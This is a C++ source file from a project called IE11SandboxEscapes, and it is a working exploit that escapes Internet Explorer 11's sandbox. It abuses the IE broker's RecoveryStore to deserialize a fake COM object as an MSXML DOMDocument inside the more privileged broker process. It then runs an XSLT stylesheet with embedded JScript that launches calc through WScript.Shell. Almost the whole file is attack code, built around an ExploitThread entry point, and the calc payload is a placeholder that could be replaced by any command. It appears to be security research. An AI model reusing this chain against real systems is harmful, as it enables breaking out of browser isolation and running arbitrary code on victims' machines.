// This file is part of IE11SandboxEsacapes.

// IE11SandboxEscapes is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.

// IE11SandboxEscapes is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with IE11SandboxEscapes.  If not, see <http://www.gnu.org/licenses/>.

#include "stdafx.h"
#include <Utils.h>
#include <Shlwapi.h>
#include <Exdisp.h>
#include <comdef.h>

#import <msxml6.dll>

// CSandboxTestObject

CLSID CLSID_IERecoveryStore = { 0x10BCEB99, 0xFAAC, 0x4080, { 0xB2, 0xFA, 0xD0, 0x7C, 0xD6, 0x71, 0xEE, 0xF2 } };

_COM_SMARTPTR_TYPEDEF(IPropertyBag, __uuidof(IPropertyBag));

class FakeClass : public IPersistStream
{
	HMODULE m_hModule;
	LONG m_interlocked;

public:
	FakeClass()
	{
		m_interlocked = 1;
	}

	virtual HRESULT STDMETHODCALLTYPE QueryInterface(
		/* [in] */ REFIID riid,
		/* [iid_is][out] */ _COM_Outptr_ void __RPC_FAR *__RPC_FAR *ppvObject)
	{
		*ppvObject = nullptr;

		if (IsEqualGUID(riid, IID_IUnknown))
		{
			*ppvObject = this;
		}
		else if (IsEqualIID(riid, IID_IPersistStream))
		{
			*ppvObject = this;
		}
		else if (IsEqualIID(riid, IID_IPersist))
		{
			*ppvObject = this;
		}
		else
		{
			LPOLESTR lpIID;
			StringFromIID(riid, &lpIID);

			DebugPrintf("QI for: %ls\n", lpIID);

			CoTaskMemFree(lpIID);

			return E_NOINTERFACE;
		}

		reinterpret_cast<IUnknown*>(*ppvObject)->AddRef();

		return S_OK;
	}

	virtual ULONG STDMETHODCALLTYPE AddRef(void) {
		return InterlockedIncrement(&m_interlocked);
	}

	virtual ULONG STDMETHODCALLTYPE Release(void) {
		LONG ret = InterlockedDecrement(&m_interlocked);

		if (ret == 0)
		{
			DebugPrintf("Deleting Object: %p\n", this);
			delete this;
		}

		return ret;
	}

	virtual HRESULT STDMETHODCALLTYPE GetClassID(
		/* [out] */ __RPC__out CLSID *pClassID)
	{
		CLSID CLSID_DOMDocument6 = __uuidof(MSXML2::DOMDocument60);

		memcpy(pClassID, &CLSID_DOMDocument6, sizeof(CLSID));

		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE IsDirty(void)
	{
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE Load(
		/* [unique][in] */ __RPC__in_opt IStream *pStm)
	{
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE Save(
		/* [unique][in] */ __RPC__in_opt IStream *pStm,
		/* [in] */ BOOL fClearDirty)
	{
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE GetSizeMax(
		/* [out] */ __RPC__out ULARGE_INTEGER *pcbSize)
	{
		pcbSize->QuadPart = 1024;

		return S_OK;
	}

};

HRESULT WriteToPropertyBag(IStorage* storage, LPCWSTR lpName, VARIANT& v)
{
	IPropertyBagPtr bag;

	HRESULT hr = storage->QueryInterface(IID_PPV_ARGS(&bag));
	if (SUCCEEDED(hr))
	{
		hr = bag->Write(lpName, &v);
	}

	return hr;
}


HRESULT ReadFromPropertyBag(IStorage* storage, LPCWSTR lpName, VARIANT& v)
{
	IPropertyBagPtr bag;

	HRESULT hr = storage->QueryInterface(IID_PPV_ARGS(&bag));
	if (SUCCEEDED(hr))
	{
		hr = bag->Read(lpName, &v, nullptr);
	}

	return hr;
}

void DoRecoveryStore()
{
	IIEUserBrokerPtr broker = CreateBroker();

	if (broker)
	{
		IRecoveryStorePtr recovery;

		HRESULT hr = broker->BrokerCreateKnownObject(CLSID_IERecoveryStore, __uuidof(IRecoveryStore), (IUnknown**)&recovery);

		if (SUCCEEDED(hr))
		{
			DebugPrintf("Created RecoveryStore: %p\n", recovery);
			bstr_t url = L"http://www.microsoft.com";

			hr = recovery->Initialize(GetCurrentProcessId(), 0, 0, url);
			if (SUCCEEDED(hr))
			{
				bstr_t name = L"hello";

				GUID newGuid;
				CoCreateGuid(&newGuid);

				hr = recovery->CreateFrame(newGuid, 0, 0);

				if (SUCCEEDED(hr))
				{
					ITabRecoveryDataPtr tab;

					hr = recovery->CreateTab(newGuid, name, &tab);
					if (SUCCEEDED(hr))
					{
						DebugPrintf("Set Title %08X\n", tab->SetCurrentTitle(bstr_t(L"test")));
						DebugPrintf("Flush: %08X\n", tab->Flush());

						DebugPrintf("Created Tab\n");
						IStoragePtr storage;

						hr = tab->GetStorage(&storage);

						if (SUCCEEDED(hr))
						{
							IStorage* newStorage = nullptr;

							// Create sub-storage and add a serialized DOMDocument
							hr = storage->CreateStorage(L"TestStorage", STGM_READWRITE | STGM_CREATE | STGM_SHARE_EXCLUSIVE, 0, 0, &newStorage);
							if (SUCCEEDED(hr))
							{
								FakeClass* c = new FakeClass();
								variant_t v = c;

								hr = WriteToPropertyBag(newStorage, L"Hello", v);

								newStorage->Commit(STGC_DEFAULT);

								newStorage->Release();
								newStorage = nullptr;

								c->Release();
							}
							else
							{
								DebugPrintf("Error creating storage: %08X\n", hr);
							}

							// Modify saved stream, have to do it here because there seems to be a problem somewhere which gums up IPersistStream::Save
							hr = storage->OpenStorage(L"TestStorage", nullptr, STGM_READWRITE | STGM_SHARE_EXCLUSIVE, nullptr, 0, &newStorage);
							if (SUCCEEDED(hr))
							{
								variant_t v;

								hr = ReadFromPropertyBag(newStorage, L"Hello", v);
								DebugPrintf("Read: %08X\n", hr);

								DebugPrintf("%d %p\n", v.vt, v.punkVal);

								IStream* pStm;

								hr = v.punkVal->QueryInterface(&pStm);
								DebugPrintf("Stream: %08X\n", hr);
								if (SUCCEEDED(hr))
								{
									LARGE_INTEGER seekPos = { 0 };
									ULARGE_INTEGER filePos = { 0 };
									pStm->Seek(seekPos, STREAM_SEEK_END, &filePos);

									std::string s = "<root/>";

									ULONG written;
									DebugPrintf("Write: %08X\n", pStm->Write(s.c_str(), s.length(), &written));
									pStm->Commit(STGC_DEFAULT);

									pStm->Release();
								}

								newStorage->Release();
								newStorage = nullptr;

							}
							else
							{
								DebugPrintf("Error opening storage: %08X\n", hr);
							}

							// Get back DOMDocument, it will now be in broker process, run JScript to escape sandbox
							hr = storage->OpenStorage(L"TestStorage", nullptr, STGM_READ | STGM_SHARE_EXCLUSIVE, nullptr, 0, &newStorage);
							if (SUCCEEDED(hr))
							{
								variant_t v;

								v.vt = VT_UNKNOWN;

								hr = ReadFromPropertyBag(newStorage, L"Hello", v);
								DebugPrintf("Read: %08X\n", hr);

								DebugPrintf("%d %p\n", v.vt, v.punkVal);

								try
								{
									if (hr == S_OK)
									{
										MSXML2::IXMLDOMDocument3Ptr pDoc;

										pDoc = v.punkVal;

										DebugPrintf("Set Property: %08X\n", pDoc->setProperty("AllowXsltScript", true));

										// Load XSLT and transform
										DebugPrintf("Load2: %d\n", pDoc->loadXML("<xsl:stylesheet version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' xmlns:msxsl='urn:schemas-microsoft-com:xslt' xmlns:user='http://mycompany.com/mynamespace'> <msxsl:script language='JScript' implements-prefix='user'> function xml(nodelist) { var o = new ActiveXObject('WScript.Shell'); o.Exec('calc'); return nodelist.nextNode().xml; } </msxsl:script> <xsl:template match='/'> <xsl:value-of select='user:xml(.)'/> </xsl:template> </xsl:stylesheet>"));
										pDoc->transformNode(pDoc);
									}
								}
								catch (_com_error& e)
								{
									DebugPrintf("Error in COM: %ls\n", e.ErrorMessage());
								}

								newStorage->Release();
								newStorage = nullptr;

							}
							else
							{
								DebugPrintf("Error opening storage: %08X\n", hr);
							}
							DebugPrintf("Commit: %08X\n", storage->Commit(STGC_DEFAULT));
							DebugPrintf("Close: %08X\n", tab->CloseStorage());
						}
						else
						{
							DebugPrintf("Error getting storage %08X\n", hr);
						}

						storage.Release();
					}
					else
					{
						DebugPrintf("Couldn't create tab %08X\n", hr);
					}
				}
				else
				{
					DebugPrintf("CreateFrameError: %08X\n", hr);
				}
			}
			else
			{
				DebugPrintf("Failed to initialize: %08X\n", hr);
			}
		}
		else
		{
			DebugPrintf("Failed: %08X\n", hr);
		}
	}
}

DWORD CALLBACK ExploitThread(LPVOID hModule)
{
	CoInitialize(nullptr);
	DoRecoveryStore();
	CoUninitialize();

	FreeLibraryAndExitThread((HMODULE)hModule, 0);

	return 0;
}